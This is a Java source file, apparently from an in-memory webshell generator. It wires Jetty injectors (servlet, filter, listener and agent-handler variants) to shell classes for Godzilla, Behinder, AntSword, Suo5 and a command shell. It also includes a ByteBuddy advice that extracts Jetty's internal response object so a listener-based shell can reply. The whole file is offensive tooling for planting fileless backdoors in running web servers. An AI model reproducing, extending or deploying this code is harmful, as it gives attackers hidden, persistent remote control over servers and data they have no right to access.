package com.reajason.javaweb.memshell.server;

import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.generator.ListenerGenerator;
import com.reajason.javaweb.memshell.jetty.antsword.AntSwordHandlerAdvisor;
import com.reajason.javaweb.memshell.jetty.behinder.BehinderHandlerAdvisor;
import com.reajason.javaweb.memshell.jetty.command.CommandHandlerAdvisor;
import com.reajason.javaweb.memshell.jetty.godzilla.GodzillaHandlerAdvisor;
import com.reajason.javaweb.memshell.jetty.injector.JettyFilterInjector;
import com.reajason.javaweb.memshell.jetty.injector.JettyHandlerAgentInjector;
import com.reajason.javaweb.memshell.jetty.injector.JettyListenerInjector;
import com.reajason.javaweb.memshell.jetty.injector.JettyServletInjector;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordFilter;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordServlet;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderFilter;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderServlet;
import com.reajason.javaweb.memshell.shelltool.command.CommandFilter;
import com.reajason.javaweb.memshell.shelltool.command.CommandServlet;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilter;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaServlet;
import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Filter;
import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Servlet;
import com.reajason.javaweb.memshell.utils.ShellCommonUtil;
import net.bytebuddy.asm.Advice;
import net.bytebuddy.implementation.bytecode.assign.Assigner;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/7
 */
public class JettyShell extends AbstractShell {

    public static class ListenerInterceptor {

        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(0) Object request, @Advice.Return(readOnly = false, typing = Assigner.Typing.DYNAMIC) Object response) throws Exception {
            try {
                response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "_channel"), "_response");
            } catch (Exception e) {
                response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "_connection"), "_response");
            }
        }
    }

    @Override
    protected InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(SERVLET, JettyServletInjector.class)
                .addInjector(JAKARTA_SERVLET, JettyServletInjector.class)
                .addInjector(FILTER, JettyFilterInjector.class)
                .addInjector(JAKARTA_FILTER, JettyFilterInjector.class)
                .addInjector(LISTENER, JettyListenerInjector.class)
                .addInjector(JAKARTA_LISTENER, JettyListenerInjector.class)
                .addInjector(JETTY_AGENT_HANDLER, JettyHandlerAgentInjector.class)
                .build();
    }

    @Override
    protected void init() {
        Class<?> commandListenerClass = ListenerGenerator.generateListenerShellClass(ListenerInterceptor.class, ShellTool.Command);
        addToolMapping(ShellTool.Command, ToolMapping.builder()
                .addShellClass(SERVLET, CommandServlet.class)
                .addShellClass(JAKARTA_SERVLET, CommandServlet.class)
                .addShellClass(FILTER, CommandFilter.class)
                .addShellClass(JAKARTA_FILTER, CommandFilter.class)
                .addShellClass(LISTENER, commandListenerClass)
                .addShellClass(JAKARTA_LISTENER, commandListenerClass)
                .addShellClass(JETTY_AGENT_HANDLER, CommandHandlerAdvisor.class)
                .build());

        Class<?> godzillaListenerClass = ListenerGenerator.generateListenerShellClass(ListenerInterceptor.class, ShellTool.Godzilla);
        addToolMapping(ShellTool.Godzilla, ToolMapping.builder()
                .addShellClass(SERVLET, GodzillaServlet.class)
                .addShellClass(JAKARTA_SERVLET, GodzillaServlet.class)
                .addShellClass(FILTER, GodzillaFilter.class)
                .addShellClass(JAKARTA_FILTER, GodzillaFilter.class)
                .addShellClass(LISTENER, godzillaListenerClass)
                .addShellClass(JAKARTA_LISTENER, godzillaListenerClass)
                .addShellClass(JETTY_AGENT_HANDLER, GodzillaHandlerAdvisor.class)
                .build());

        Class<?> behinderListenerClass = ListenerGenerator.generateListenerShellClass(ListenerInterceptor.class, ShellTool.Behinder);
        addToolMapping(ShellTool.Behinder, ToolMapping.builder()
                .addShellClass(SERVLET, BehinderServlet.class)
                .addShellClass(JAKARTA_SERVLET, BehinderServlet.class)
                .addShellClass(FILTER, BehinderFilter.class)
                .addShellClass(JAKARTA_FILTER, BehinderFilter.class)
                .addShellClass(LISTENER, behinderListenerClass)
                .addShellClass(JAKARTA_LISTENER, behinderListenerClass)
                .addShellClass(JETTY_AGENT_HANDLER, BehinderHandlerAdvisor.class)
                .build());

        Class<?> suo5ListenerClass = ListenerGenerator.generateListenerShellClass(ListenerInterceptor.class, ShellTool.Suo5);
        addToolMapping(ShellTool.Suo5, ToolMapping.builder()
                .addShellClass(SERVLET, Suo5Servlet.class)
                .addShellClass(JAKARTA_SERVLET, Suo5Servlet.class)
                .addShellClass(FILTER, Suo5Filter.class)
                .addShellClass(JAKARTA_FILTER, Suo5Filter.class)
                .addShellClass(LISTENER, suo5ListenerClass)
                .addShellClass(JAKARTA_LISTENER, suo5ListenerClass)
                .build());

        Class<?> antSwordListenerClass = ListenerGenerator.generateListenerShellClass(ListenerInterceptor.class, ShellTool.AntSword);
        addToolMapping(ShellTool.AntSword, ToolMapping.builder()
                .addShellClass(SERVLET, AntSwordServlet.class)
                .addShellClass(FILTER, AntSwordFilter.class)
                .addShellClass(LISTENER, antSwordListenerClass)
                .addShellClass(JETTY_AGENT_HANDLER, AntSwordHandlerAdvisor.class)
                .build());
    }
}
